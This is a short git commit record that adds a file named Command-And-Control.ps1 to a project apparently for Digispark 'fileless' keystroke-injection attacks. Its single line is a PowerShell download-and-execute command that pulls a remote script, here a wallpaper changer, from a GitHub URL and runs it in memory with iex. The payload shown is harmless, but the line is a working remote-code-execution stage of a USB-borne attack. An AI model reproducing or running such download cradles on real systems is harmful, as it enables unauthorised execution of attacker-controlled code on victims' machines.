f0045024c662fe00f4c50d0e210767eed446388b
Carlos Ramos <r4mos@users.noreply.github.com>
2022-02-01 22:57:33 +0100

    Add default command

---
+++ Digispark-Duckduino-Fileless/Command-And-Control.ps1
@@ -0,0 +1,1 @@
+powershell.exe -command "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/r4mos/Digispark-Duckduino-Fileless/main/Digispark-Duckduino-Fileless/Wallpaper-Changer/Wallpaper-Changer.ps1')"
